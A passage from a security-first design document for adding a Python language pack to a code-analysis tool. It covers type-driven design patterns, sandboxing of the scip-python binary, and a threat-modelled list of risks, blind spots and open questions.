- The full Phase 1–7 TS/JS suite (~2,300 tests) runs unchanged and green as a hard CI gate.

## Design patterns applied

| Decision | Pattern applied | Why this pattern here | Pattern not applied (and why) |
|---|---|---|---|
| `LanguagePack` is a total frozen value with one mandatory field per capability | Make-illegal-states-unrepresentable | A half-configured language is the core threat to extension-by-addition; the type system must make "partial pack" non-constructible — `mypy --strict` is a stronger guarantee than any runtime check or reviewer | Not a builder/optional-fields config object — that would *permit* the illegal partial state the whole design exists to forbid |
| `register_language()` validates-then-commits-or-rolls-back across three registries | Command pattern + two-phase commit | Registration is a single privileged mutation that must be atomic and fail-closed; modeling it as one reversible command makes "all or nothing" structural, not hoped-for | Not naive imperative "loop and register each capability" — a mid-loop failure leaves a silently corrupt kernel |
| `scip-python` and the Python parsers reach the outside only through `run_external_cli` / probe ports | Hexagonal ports & adapters | The deterministic core (gather logic) must not know about the network or external binaries; isolating `scip-python` behind the jailed wrapper port keeps the no-net invariant structural and lets `import-linter` enforce it | Not direct `subprocess`/`requests` calls in dep-graph code — that would dissolve the trust boundary the fence depends on |
| `AdapterConfidence = Trusted \| Degraded \| Unavailable` drives the scip→tree-sitter fallback | Tagged union for trust state | A hostile or missing `scip-python` must *degrade precision*, never block or silently lie; an exhaustive sum type forces every dispatch site to handle `Unavailable` and `assert_never` catches a missed case at compile time | Not a `float` confidence with magic thresholds (the ADR-0033 amendment to ADR-0032's `confidence() -> float`) — a float invites silent threshold drift |
| `PackageManager` / `Language` / `language_id` are newtypes; `requirements.txt` directives are a closed `Literal` set | Smart constructors + closed sum types | Domain IDs flowing across the registry boundary must not be confusable raw `str`; classifying every `requirements.txt` directive into a closed set means an unknown directive is a *visible* `unresolved`, never a silently-honored one | Not raw `str` keys — a typo'd `PackageManager` key in a pack would silently register nothing |
| The Python project detector is additive (never demotes a prior verdict) | Functional core / monotone accumulation | Detection over attacker-controlled markers must be tamper-resistant: a planted `pyproject.toml` may only *add* a verdict, never *remove* the Node one — monotonicity makes mis-routing-by-demotion impossible | Not a single-winner classifier — that would let a planted marker hijack a Node repo into the Python path |

## Risks (top 3–5)

1. **A malicious `LanguagePack` module is trusted code at import time.** `register_language()` validates the *shape* and rejects *shadowing*, but a pack module can run arbitrary Python at import (read `~/`, open a socket) *before* `register_language()` is even called. `import-linter` contracts over the new Python pack sub-packages and PR review are the controls — neither is airtight. **Mitigation direction:** keep pack modules tiny and declarative (a pack should be ~one `LanguagePack(...)` literal and nothing else); a future ADR could mandate that pack modules contain *only* a `LanguagePack` construction and capability imports, fence-checked by AST.
2. **`scip-python` is a large, pyright-based, network-capable binary.** It is jailed (deny-all egress, scrubbed env, timeout) — but the microVM (ADR-0012) does not exist until Phase 5+ for *trust gates*, and gather runs `scip-python` on the orchestrator/CI host. The subprocess jail (`run_external_cli`/`bwrap`/`sandbox-exec`) is weaker than a microVM. A `scip-python` 0-day that escapes the jail reaches the host. **Mitigation direction:** `scip-python` is optional behind the degrade ladder — a security-strict deployment can disable it entirely and accept tree-sitter-only precision.
3. **The sanctioned "migration" path is a new way to edit frozen surfaces.** ADR-0043 makes migrations legitimate; an attacker can frame a behavior-changing edit as a migration and regenerate goldens to keep the suite green. The category-based fence + adversarial conformance fixtures + golden dirty-tree guard raise the bar, but "is this migration's golden regeneration legitimate?" is ultimately a *judgement call* ADR-0043 itself admits has no mechanical fence.
4. **`requirements.txt` is a moving target.** pip's requirements syntax accrues directives (`--hash`, environment markers, `--config-settings`, constraints files). A directive the classifier doesn't recognize must fail *closed* (treated as `unresolved`, never honored) — but a directive that *looks* benign and is silently dropped could hide a real dependency from the graph. The classifier must default-deny on unknown directives and emit a warning.
5. **Conformance-fixture rot.** `tests/conformance/` is the safety net for the migration path. If the adversarial fixtures aren't *maintained* as Python tooling evolves (new lockfile format, new `pyproject.toml` field), the net develops holes silently. The conformance suite needs the same honest-confidence discipline as the probes — a fixture that no longer exercises what it claims should fail loudly.

## Acknowledged blind spots

- **Import-time code in pack modules.** As risk #1 notes, the design controls *what `register_language()` does* but not *what a pack module does before it is called*. This phase relies on `import-linter` + review; a true fix (AST-fenced declarative-only pack modules) is deferred.
- **No microVM at gather time.** `scip-python` runs under the subprocess jail, not a microVM. This is consistent with the codebase (microVM is for Phase 5+ trust gates, not gather) but it is a real residual: a jail escape is host compromise. Out of scope to fix here; flagged.
- **Supply-chain provenance of the wheels.** We pin and hash `tree-sitter-python` and `scip-python`, which defends against *post-publication* tampering — but a wheel that was *malicious at first publication* (a compromised maintainer account) passes a hash check. Sigstore/SLSA provenance verification of the wheels is not in scope for 7.5.
- **Polyglot dispatch precedence.** A repo that is genuinely both Node and Python registers both packs' probes. The coordinator runs both. This phase does not deeply analyze whether a Python probe and a Node probe could *interfere* via shared `RepoContext` keys — the schema's per-probe sub-schema isolation should prevent it, but an explicit polyglot-isolation test is thin here.
- **`scip-python` reads the whole repo.** Unlike the byte-capped parsers, `scip-python` ingests the entire `*.py` tree. A repo engineered to make `scip-python` consume enormous memory before the timeout fires could pressure the host. The timeout bounds *wall-clock*, not *memory*; a cgroup memory cap on the jailed process would close this, and is recommended for the synthesizer to fold in.

## Open questions for the synthesizer

1. **Should pack modules be AST-fenced to "declarative only"?** Risk #1's strongest mitigation is forbidding arbitrary import-time code in `python_pack.py`. The performance/best-practices designs may resist this as over-rigid. Recommendation: at minimum, a fence asserting pack modules contain no I/O / network / `subprocess` at import.
2. **Memory cap on `scip-python`.** A wall-clock timeout is not a memory bound. Should `run_external_cli` grow an optional cgroup/`ulimit` memory cap for the SCIP adapter? This is a small additive change to an existing wrapper.
3. **Is `scip-python` worth its attack surface at all in Phase 7.5?** Tree-sitter alone satisfies `ImportGraphAdapter` and is always-fresh and lower-risk. The security-first answer is to ship the Python search adapter *tree-sitter-first* and treat the `scip-python` adapter as a fast-follow behind the degrade ladder, keeping it out of the phase's critical path and out of `ALLOWED_BINARIES` until genuinely needed. The synthesizer should weigh this against the precision the planner (Phase 8) will want.
4. **`requirements.txt` unknown-directive policy.** Confirm default-deny (unknown → `unresolved` + warning) over default-ignore. Security-first says default-deny; this needs to be explicit in the dep-graph strategy contract.
5. **Golden-regeneration provenance.** Should a migration's golden regeneration carry a machine-checkable marker (a labeled commit trailer, a regeneration manifest) so the dirty-tree guard can distinguish a *sanctioned* regeneration from an *accidental/laundered* one? ADR-0043 leaves this as judgement; a lightweight mechanical aid would help.
